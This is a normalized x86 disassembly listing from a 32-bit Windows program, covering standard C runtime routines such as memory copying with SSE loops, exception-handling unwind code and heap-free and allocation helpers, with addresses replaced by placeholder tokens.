mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_41bc90
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_41bd89
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_41bc4a
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_419dd7
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_41ac18
push eax
mov [ esi ] eax
call sub_419e72
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_419e21
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_41c436
push esi
call sub_41a7eb
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_419eb2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_41e00f
sub_419f39
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_41d120
lea esi [ eax + 0x1 ]
push esi
call sub_41ae2a
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_41e063
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_419f97
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_419f39
mov eax esi
pop esi
pop ebp
retn 0x4
sub_419fbe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_419f79
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_419f39
jmp r-xdata
sub_419ffe
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_419f97
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41a01c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_419fbe
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41a041
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_419f79
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_41a095
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41a085
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
pop ecx
sub_41a0b6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_41e140
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_41a0f0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41a174 ]
jmp [ ecx * 4 + jump_table_41a1f4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a260 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41a3fc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_41a300 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a3fc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a260 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a3fc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a260 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a260 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a260 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a3fc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a3fc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a3fc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_41a460
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41a4e4 ]
jmp [ ecx * 4 + jump_table_41a564 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a5d0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41a76c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_41a670 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a76c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a5d0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a76c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a5d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a5d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a5d0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a76c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a76c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a76c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_41a7eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_41c34a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41c308
pop ecx
mov [ esi ] eax
pop esi
sub_41a825
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_41a85e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41a8b2
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41de45
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41a8e8
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_41ac09
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_41de45
add esp 0x20
pop esi
pop ebp
retn
sub_41a91b
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_41a9f2
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_41e872
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_41a9f2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_41ac09
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_41de45
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41a91b
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a85e
pop ebx
leave
retn
sub_41aa91
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_41ebf0
call sub_41ebf0
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_41ab04
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_41e872
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_41e872
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_41ab30
mov edi edi
push ebp
mov ebp esp
call sub_41e872
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_41ab57
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41e872
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_41e872
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_41e872
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_41ebf0
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_41aba9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41a8e8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_41ec40
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41ac18
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41ae2a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_41eda1
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
